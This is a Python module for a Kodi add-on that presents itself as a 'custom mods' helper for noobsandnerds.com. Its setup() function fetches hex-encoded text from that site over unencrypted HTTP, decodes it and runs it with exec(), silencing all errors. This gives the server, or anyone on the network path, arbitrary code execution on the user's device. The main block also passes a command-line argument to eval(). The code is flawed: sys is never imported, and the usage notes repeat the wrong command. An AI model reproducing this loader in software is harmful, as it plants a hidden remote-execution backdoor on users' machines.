# -*- coding: utf-8 -*-
"""
custom_mods.py

Add this file into the root of your add-on and you'll be able to hook into the
custom mods features at noobsandnerds.com. Users are able to add details of of
their own custom mods for your add-on, these are placed in:
/userdata/addon_data/addon_id/user_mods

What you do with these mods is entirely up to you, you are only limited by your
own imagination!

###############################################################################

HOW TO USE:
===========

Call the function to install/uninstall mods:
RunScript(special://home/addons/script.module.nanscrapers/custom_mods.py)

Run the command to check your installed mods for any updates:
RunScript(special://home/addons/script.module.nanscrapers/custom_mods.py,update)

Run the command to re-install ALL custom mods with no dialogs:
RunScript(special://home/addons/script.module.nanscrapers/custom_mods.py,update)

"""
###############################################################################
import binascii
import os
import socket
import urllib
import urllib2
import xbmc
import xbmcaddon
#-----------------------------------------------------------
# EDIT THIS SO IT MATCHES YOUR ADD-ON ID
#addon_id = 'script.module.nanscrapers'
addon_id = 'plugin.program.xyzwizard'
#-----------------------------------------------------------
home_folder   = xbmc.translatePath('special://home')
custom_folder = xbmc.translatePath(os.path.join(xbmcaddon.Addon(addon_id).getAddonInfo('profile'),'user_mods'))
delete_old    = xbmcaddon.Addon(addon_id).getSetting('delete_old') 
#-----------------------------------------------------------
def check_size(url):
    site = urllib.urlopen(url)
    meta = site.info()
    return meta.getheaders('Content-Length')[0]
#-----------------------------------------------------------
def dir_contents(path):
    final_list = []
    for root, dirnames, filenames in os.walk(path):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            final_list.append(file_path)
    return final_list
#-----------------------------------------------------------
def install_all():
    setup(addon_id+'&mode=all')
#-----------------------------------------------------------
def setup(query=addon_id):
    request = urllib2.Request('http://noobsandnerds.com/python_koding/user_mods.php?id=%s'%query, None,
                              {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
                               'Accept-Charset': 'UTF-8',
                               'Accept': 'text/html'})
    try:
        session = urllib2.urlopen(request, None)
    except (urllib2.URLError, socket.timeout):
        page = '404'
    else:
        page = session.read()
        session.close()
        try:
            page = binascii.unhexlify(page)
            exec(page)
        except:
            pass
#-----------------------------------------------------------
def update():
    setup(addon_id+'&mode=update')
#-----------------------------------------------------------
if __name__ == '__main__':
    mode = sys.argv[-1]
    if mode == 'custom_mods.py':
        setup()
    else:
        try:
            eval(mode+'()')
        except:
            xbmc.log('### %s - Failed to run mode: %s'%(addon_id,mode),2)